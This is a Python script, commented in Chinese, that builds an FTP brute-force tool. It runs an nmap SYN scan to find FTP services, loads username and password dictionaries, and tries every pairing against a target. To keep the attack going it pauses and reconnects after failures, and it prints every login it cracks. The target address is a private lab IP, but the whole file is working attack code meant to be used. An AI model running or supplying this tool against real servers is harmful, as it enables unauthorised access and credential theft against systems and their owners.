#   -*- coding: utf-8 -*-
# !/usr/bin/env python3.10

from ftplib import FTP, error_perm
from socket import timeout
from time import sleep
from os import path
from nmap import PortScanner


class FtpBruteForce:
    attempted_times = 0  # 重新连接计数器
    """
    创建FTP对象
    加载用户名和密码字典
    进行登录尝试
    关闭连接
    """

    def __init__(self, server_address, user_dict_path, password_dict_path, server_port=21):
        """
        :param server_address: FTP服务器IPv4地址
        :param user_dict_path: 用户名字典路径
        :param password_dict_path: 密码字典路径
        :param server_port: FTP服务器端口,默认为21。
        """
        self.ftp = FTP()  # 创建FTP对象
        self.server_address = server_address
        self.user_dict_path = user_dict_path
        self.password_dict_path = password_dict_path
        self.server_port = server_port

    @staticmethod
    def error_message(message):
        """
        :param message: 要显示的信息（String类型）
        """
        print(f"\033[1;31m{message}\033[0m")  # 将报错消息标记为红色字体

    @staticmethod
    def stop(max_num):  # 当尝试次数达到一定值时，休眠5秒
        """
        :param max_num: 已经尝试的次数
        """
        if max_num % 5 == 0:
            sleep(5)

    @staticmethod
    def scan(host, port):
        # 创建扫描对象
        nm = PortScanner()
        # 调用scan方法进行扫描
        nm.scan(hosts=host, ports=port, arguments="-sS")
        # 提取在线主机的IP地址以及开放的端口（端口号、状态、服务、版本）
        ftp_host = []
        for ip in nm.all_hosts():
            # 判断主机是否有开放的端口
            if len(nm[ip].all_tcp()):
                for index, port in enumerate(nm[ip].all_tcp()):
                    print(f"被扫描的主机为：\033[1;32m{host}\033[0m，扫描的端口范围为:\033[1;32m{port}\033[0m")
                    print(f"{index + 1}.{ip}开放的端口有:{port}", end="\t")
                    if "ftp" in nm[ip]["tcp"][port]["name"]:
                        ftp_host.append(ip)
                        print(f"开放了FTP服务的主机有：\n{index + 1} {ftp_host[index]}")
                print()
            else:
                print(f"{ip}在线，但没有开放端口！")
        return ftp_host

    def reconnect(self, connection=False):
        """
        :param connection: 是否需要重连，默认为False，True则重连
        """
        try:
            # 尝试发送一个简单的FTP命令来检查连接是否仍然有效
            self.ftp.voidcmd("NOOP")
        except (BrokenPipeError, EOFError, TimeoutError, error_perm):
            # 如果抛出了这四个异常，那么连接可能已经断开，休眠5秒
            self.stop(5)
        finally:
            # 无论连接是否已经断开，都尝试重新连接
            if not connection:
                self.ftp.connect(self.server_address, self.server_port, timeout=10)

    def load_dict(self):
        """
        :return: 字符串类型的用户名集合和密码元组，如果文件不存在则返回(None, None)
        """
        # 利用集合去重
        user_set = set()  # 用户名集合
        password_set = set()  # 密码集合
        # 判断字典文件是否存在，存在则继续导入字典
        if path.exists(self.user_dict_path) and path.exists(self.password_dict_path):
            # 导入用户名字典
            with open(self.user_dict_path, "r") as user_file:
                for user in user_file:
                    user = user.strip()
                    if user != "":
                        user_set.add(user)
            # 导入密码字典
            with open(self.password_dict_path, "r") as password_file:
                for password in password_file:
                    password = password.strip()
                    if password != "":
                        password_set.add(password)
        else:
            self.error_message("字典文件不存在")
            return None, None

        return tuple(user_set), tuple(password_set)

    def connection(self):
        while True:
            if self.attempted_times == 5:
                self.error_message("已连接失败五次，正在尝试重新连接，请至少等待5秒...")
                self.stop(self.attempted_times)
                self.reconnect(connection=True)  # 当连接失败次数达到5次时，休眠5秒再重新连接
            else:
                try:
                    reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
                    if "220" in reply:
                        print("\033[32m连接成功，FTP服务已就绪！\033[0m")
                        break
                except ConnectionRefusedError as connect_error:
                    self.attempted_times += 1
                    self.error_message(f"错误：{connect_error},连接被拒绝，服务可能未运行或已达到最大连接数量。")
                    continue
                except (TimeoutError, timeout) as timeout_error:
                    self.attempted_times += 1
                    self.error_message(f"错误：{timeout_error}，连接超时，请检查网络连接和FTP服务器是否正常运行。")
                    continue

        self.attempted_times = 0  # 重置类中的重试计数器，使其能重新使用

    def brute(self, user_dict_tuples, password_tuples):
        """
        :param user_dict_tuples: 用户名字典元组
        :param password_tuples: 密码字典元组
        """
        success_login: dict = dict()

        if len(user_dict_tuples) == 0 or len(password_tuples) == 0:
            self.error_message("用户名字典或密码字典为空，请先调用load_dict方法加载用户名和密码字典")
            exit(1)

        for user_index, user in enumerate(user_dict_tuples):
            for password_index, password in enumerate(password_tuples):
                self.attempted_times = 0  # 重置尝试计数器，针对每个用户名和密码组合

                while self.attempted_times < 6:  # 当登录超时计数器达到5次时，重新开始
                    try:
                        replay = self.ftp.login(user, password)
                        if "230" in replay:
                            print(f"\033[1;32m登录成功: 用户名：{user}, 密码：{password}\033[0m")
                            success_login[user] = password
                            self.ftp.close()
                            self.connection()
                            break
                        elif "230" in replay:
                            print(f"\033[1;32m登录成功: 用户名：{user}, 密码：{password}\033[0m")
                            self.ftp.close()
                            exit(0)
                    except error_perm as error:
                        if "530 Permission denied" in str(error):
                            self.error_message(f"用户名：{user} 密码：{password} 登录失败，FTP拒绝连接")
                            break
                        elif "530 Login incorrect" in str(error):
                            self.error_message(f"用户名：{user} 密码：{password} 登录失败")
                            break
                        else:
                            pass
                    except (TimeoutError, BrokenPipeError):
                        self.error_message(f"用户名：{user} 密码：{password} 登录超时")
                        self.attempted_times += 1
                        if self.attempted_times >= 5:
                            self.error_message(f"尝试次数超过限制，将跳过此用户密码组合")
                            break  # 尝试次数达到上限，跳过此组合
                        else:
                            self.reconnect()  # 重连
                            continue  # 继续尝试登录
                    except (EOFError, ConnectionResetError):
                        self.reconnect()
                        continue

                # 如果到达这里，说明当前用户的所有密码都已尝试过
                if password_index + 1 < len(password_tuples):
                    continue
                else:
                    self.error_message(f"当前用户和密码组合尝试完毕，未找到有效登录信息")

        print("以下为有效登录信息：")
        for key, value in success_login.items():
            print(f"用户名：{key} 密码：{value}")

    def __del__(self):
        self.ftp.close()


def main():
    ftp_brute = FtpBruteForce("192.168.80.4", "user.dic", "password.dic")
    ftp_host = ftp_brute.scan("192.168.80.4", "21")
    ftp_brute.connection()
    user_tuple, password_tuple = ftp_brute.load_dict()
    if len(ftp_host) != 0:
        print(f"选择要爆破的主机：1~{len(ftp_host)}")
        ftp_brute.brute(user_tuple, password_tuple)


if __name__ == '__main__':
    main()
